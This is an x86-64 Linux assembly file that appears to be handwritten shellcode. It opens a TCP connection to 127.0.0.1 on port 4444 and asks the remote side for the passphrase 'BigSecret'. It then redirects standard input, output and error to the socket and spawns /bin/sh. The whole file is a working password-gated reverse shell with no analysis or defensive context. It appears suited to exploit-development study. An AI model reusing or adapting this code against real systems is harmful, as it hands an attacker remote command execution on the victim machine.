global _start
section .text

_start:
	mov rbp, rsp
	jmp short _strdata 	; Find address of string list
	
_getref:	; Keep reference to strings
	pop r15
	jmp short _main

_strdata:
	call _getref		; Push RIP onto stack
	prompt: db "?", 0xa
	pass:	db "BigSecret"
	good:	db "OK", 0xa
	
_prompt:	; send string to a socket, RSI and RDX populated before call	
	mov rdi, [rbp-24]
	xor rax, rax	
	mov r10, rax	; Zero unused params
	mov r8, rax
	mov r9, rax	
	add al, 44		; sys_sendto
	syscall
	ret
	
_exit:		; exit nicely
	push 0x3c
	push 1
	pop rbx
	pop rax
	mov rsp, rbp
	syscall	
		
_main:
; Build a server sockaddr_in struct on the stack
    xor rax, rax
    push rax            ; sin_zero
    inc eax             ; start the 127.0.0.1 address
    shl eax, 24         ; pad with three zeros
    add al, 0x7f        ; overwrite the last with 0x7f / 127
    shl rax, 16
    add ax, 0x5c11      ; htons(4444)
    shl rax, 16
    add al, 2           ; sin_family
    push rax
	
; Create Socket	
	xor rdi, rdi
	push rdi
	push rdi
	pop rax
	pop rdx
	inc edi
	push rdi
	pop rsi				; SOCK_STREAM (1)
	inc edi				; AF_INET (2)
	add al, 41	  	    ; syscall 41
	syscall
	cmp eax, -1
	jle short _exit
	push rax 	  	    ; store socket id on stack
	
; Connect to remote host
	pop rdi
	push rdi            ; socket id
	lea rsi, [rbp-16]   ; sockaddr struct
	push 16
	pop rdx				; struct size
	push 42
	pop rax 			; sys_connect
	syscall
	cmp eax, -1
	jle short _exit

; Send message
	mov rsi, r15		; string address
	push 2
	pop rdx             ; string length
	call _prompt
	
; Listen for response
	pop rdi
	push rdi            ; socket id
	lea rsi, [rbp-16]	; buffer address
	xor rax, rax 		; Zero out registers
	push rax
	pop r10
	mov r8, rax
	mov r9, rax	
	push 9
	pop rdx		    ; buffer length
	add al, 45		; recvfrom
	syscall
	
; Check for correct pass phrase
	lea rsi, [rbp-16]	; input buffer address
	lea rdi, [r15+2]	; password string address
	push 9
	pop rcx			; length
_cmploop:
	cmpsb			; compare bytes
	jne short _end	; exit if no match
	loop _cmploop   ; next char	

; good passphrase (fallthrough)
	lea rsi, [r15+11]	; OK string
	push 3
	pop rdx			; welcome length
	call _prompt

; Duplicate I/O descriptors
	xor rax, rax 	
	pop rdi
	push rdi		; socket id
	push rax
	pop rsi			; 0 = STDIN
	add al, 33		; dup2	
	push rax		; keep syscall id
	syscall 

	pop rax  		; dup2
	push rax
	inc esi			; 1 = STDOUT
	syscall

	pop rax			; dup2
	inc esi			; 2 = STDERR
	syscall
	
; spawn a shell
	xor rax, rax
	push rax
	pop rdx			; less instructions than MOV
	mov rbx, 0x68732f6e69622f78 ; build X/bin/sh
	shr rbx, 8		; shift the ¨X¨ and append a NULL
	mov [rbp-16], rbx	; copy ¨/bin/sh¨ string to buffer
	lea rdi, [rbp-16] 	; get the /bin/sh string
	push rax		; build args array, by pushing NULL
	push rdi		; then pushing string address
	mov rsi, rsp		; args array address
	add al, 59		; execve
	syscall
_end:
	call _exit	
	
	
	
